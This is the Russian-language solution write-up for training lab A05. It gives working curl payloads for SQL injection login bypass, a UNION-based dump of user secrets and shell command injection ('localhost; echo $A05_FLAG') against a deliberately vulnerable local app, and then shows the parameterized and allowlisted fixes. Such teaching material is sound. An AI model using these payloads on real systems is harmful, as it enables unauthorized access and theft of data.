🌐 [English](./SOLUTION.md) · **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)

# A05 — Решение (спойлеры!)

Сначала попробуйте пройти лабу сами, используя подсказки из [README](./README.ru.md).

Все запросы ниже относятся к vulnerable (порт 8041). В браузере полезные нагрузки ставятся в те же поля — сайт и `/ui` покажут тот же результат.

## 1. Обход входа

Запрос в приложении собирается так:

```sql
SELECT username, role, secret FROM users WHERE username = '<логин>' AND password = '<пароль>'
```

Если в логин подставить `admin'--`, то всё после `--` становится комментарием, и проверка пароля исчезает:

```sql
... WHERE username = 'admin'--' AND password = 'x'
```

```bash
curl -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8041/login
# → вход админом и FLAG{a05_sqli_login_bypass}
```

Тот же флаг отдаёт `GET /me`, пока вы вошли как админ (в браузере — откройте `/admin`).

Другой вариант: логин `nobody' OR '1'='1' --`, условие становится всегда истинным, и вход выполняется под первым пользователем таблицы.

## 2. Скрытый чартерный рейс

В запросе поиска есть `AND hidden = 0`. Кавычка с `OR 1=1` делает условие всегда истинным, а `--` отбрасывает остаток:

```bash
curl -G http://127.0.0.1:8041/flights \
  --data-urlencode "from=" --data-urlencode "to=%' OR 1=1 --"
# → среди обычных рейсов появляется «SK 900» — чартер
```

Откройте его: `GET /flight/6` — в поле «Примечание» лежит `FLAG{a05_hidden_flight}`.

Попробуйте `to='` без продолжения: страница вернёт текст ошибки SQL (`unrecognized token`). Такие ошибки помогают атакующему понять структуру запроса, поэтому показывать их пользователю нельзя. Ещё пример: `max_price=abc` → `no such column: abc`.

## 3. UNION: данные из другой таблицы

Поиск возвращает 7 столбцов (`id, flight_no, origin, destination, dep_date, dep_time, price`), поэтому и в `UNION SELECT` их должно быть ровно 7:

```bash
curl -G http://127.0.0.1:8041/flights --data-urlencode "from=" \
  --data-urlencode "to=' UNION SELECT id,username,'X',secret,'2026-11-14','00:00',0 FROM users --"
# → в flight_no лежит логин, в destination — секрет:
#   admin -> FLAG{a05_sqli_union_dump}
```

В браузере фальшивые «рейсы» видны в том же списке: `admin → FLAG{...}`.

## 4. Command injection в проверке узла

Сначала получите сессию админа (шаг 1), затем отправьте хост с разделителем команд:

```bash
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8041/login
curl -s -b jar.txt -H 'Content-Type: application/json' \
  -d '{"host":"localhost; echo $A05_FLAG"}' http://127.0.0.1:8041/admin/check
# → {"output":"FLAG{a05_command_injection}\n"}
```

Приложение выполняет `ping -c 1 <хост>` через `os.popen`, то есть через оболочку, поэтому `;` запускает вторую команду — а флаг лежит в окружении процесса (`A05_FLAG`), которое оболочка видит. В Windows разделитель `&`, а переменная записывается `%A05_FLAG%`. В браузере: `/admin` → «Проверка узла аэрпорта» → хост `localhost; echo $A05_FLAG`.

## Исправления (fixed, порт 8042)

| Проблема | Исправление |
|----------|-------------|
| Склейка строк в SQL (вход, поиск) | Параметризованные запросы: `... WHERE username = ?`, `origin LIKE ?`; значения ограничены по длине и формату |
| `hidden = 0` нейтрализуется через `OR 1=1` | Условие и значения лежат в разных частях запроса — данные не могут изменить структуру |
| Текст ошибки БД в ответе | Ошибка SQL больше не возникает, а показывается только общее сообщение |
| Командная строка из пользовательского ввода | Оболочки нет вообще: хост обязан совпасть с `^[A-Za-z0-9.-]+$` и резолвится через `socket.gethostbyname` |
| Флаг в окружении процесса | Исправленная версия не кладёт секреты в окружение |

Проверка на fixed (порт 8042):

```bash
curl -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8042/login        # 401
curl -G http://127.0.0.1:8042/flights --data-urlencode "from=" \
  --data-urlencode "to=' UNION SELECT id,username,'X',secret,'2026-11-14','00:00',0 FROM users --"
# → 0 строк: полезная нагрузка ищется как обычная строка
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Adm1n-lab-pass"}' http://127.0.0.1:8042/login
curl -s -b jar.txt -H 'Content-Type: application/json' \
  -d '{"host":"localhost; echo $A05_FLAG"}' http://127.0.0.1:8042/admin/check
# → invalid host: 'localhost; echo $A05_FLAG' (allowed: letters, digits, dot, dash)
```

## Что ещё стоит помнить
- Параметризация защищает значения, но не имена таблиц и столбцов: их нельзя подставлять из ввода, только из белого списка.
- Инъекции бывают не только в SQL: команды ОС, LDAP, NoSQL-запросы, записи в логах. Принцип везде один: данные нельзя смешивать с кодом.
- Проверка ввода — это белый список, а не чёрный: «без точек с запятой» проигрывает `$IFS`, переводам строки и десяткам других трюков.
- Обход входа сработал потому, что пароль проверялся *внутри* SQL. Секреты сверяйте в коде приложения (о хранении см. лабу A04).
